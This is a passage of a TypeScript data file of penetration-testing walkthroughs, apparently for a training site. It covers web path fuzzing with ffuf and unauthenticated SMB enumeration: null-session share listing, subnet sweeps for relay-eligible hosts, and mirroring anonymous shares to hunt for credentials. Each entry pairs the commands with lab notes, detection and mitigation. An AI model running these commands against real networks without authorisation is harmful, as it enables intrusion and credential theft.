        title: "Extensions matter",
        narration: "Try common file extensions for the language/framework detected (PHP → .php, .bak).",
        command:
          "ffuf -u https://target.tld/FUZZ -w raft-medium-files.txt -e .php,.bak,.old,.zip -fs 132",
        branches: [
          {
            when: "You get rate-limited (429)",
            then:
              "Drop concurrency: -t 5, and add -p 0.2-0.5 for jitter. If the WAF blocks, coordinate an allowlist window with the client.",
          },
        ],
      },
    ],
    successCriteria:
      "You have a categorised list of endpoints (auth, api, admin, static) ready for the next round of testing.",
    detectionSummary:
      "Access logs light up: hundreds of 404s from one IP in seconds. WAFs / CDN dashboards flag it easily.",
    mitigationSummary:
      "Remove real admin panels from public exposure, return uniform 404s, and rate-limit at the edge.",
  },

  // ============================================================
  {
    slug: "smb-enum",
    title: "SMB enumeration on an internal engagement",
    scenario:
      "You are on an internal network with no creds. You'll enumerate shares, users, and quick-wins before authenticating.",
    labSetup: "GOAD, HTB Active Directory labs, or your own DC + file server VM.",
    duration: "20 minutes",
    difficulty: "beginner",
    legalNote: LAB_NOTE,
    toolSlugs: ["enum4linux-ng", "crackmapexec", "smbclient"],
    steps: [
      {
        title: "Anonymous share listing",
        narration:
          "Many misconfigured file servers still allow null sessions. Try it first — it's the softest touch you can make.",
        command: "smbclient -L //10.10.10.5 -N",
        expectedOutput:
          "Sharename       Type      Comment\nADMIN$          Disk      Remote Admin\nIPC$            IPC       Remote IPC\npublic          Disk      Public Share",
      },
      {
        title: "Full enum with enum4linux-ng",
        narration:
          "Sweeps null sessions across users, groups, shares, OS info, policies.",
        command: "enum4linux-ng -A 10.10.10.5",
      },
      {
        title: "Login-agnostic sweep with crackmapexec",
        narration:
          "Sprays a whole subnet quickly to identify what accepts null / guest.",
        command: "crackmapexec smb 10.10.10.0/24 -u '' -p ''",
        branches: [
          {
            when: "Server signing = True everywhere",
            then:
              "NTLM relay is off the table on those hosts. Look for hosts with 'signing:False' — those are relay-eligible.",
          },
        ],
      },
      {
        title: "Pull anonymous shares",
        narration: "Mount, mirror, and search for creds in scripts and .config files.",
        command:
          "smbclient //10.10.10.5/public -N -c 'recurse ON; prompt OFF; mget *'",
      },
    ],
    successCriteria:
      "You have a signing map, share inventory, and any low-hanging creds/config found in public shares.",
    detectionSummary:
      "Repeated null-session attempts across many hosts + directory listings on file shares is a common IR signal.",
    mitigationSummary:
      "Disable anonymous SMB, require signing, and use conditional access for file shares.",
  },
];

export const walkthroughBySlug = (slug: string) =>
  WALKTHROUGHS.find((w) => w.slug === slug);

export const hasWalkthrough = (slug: string) =>
  WALKTHROUGHS.some((w) => w.slug === slug);
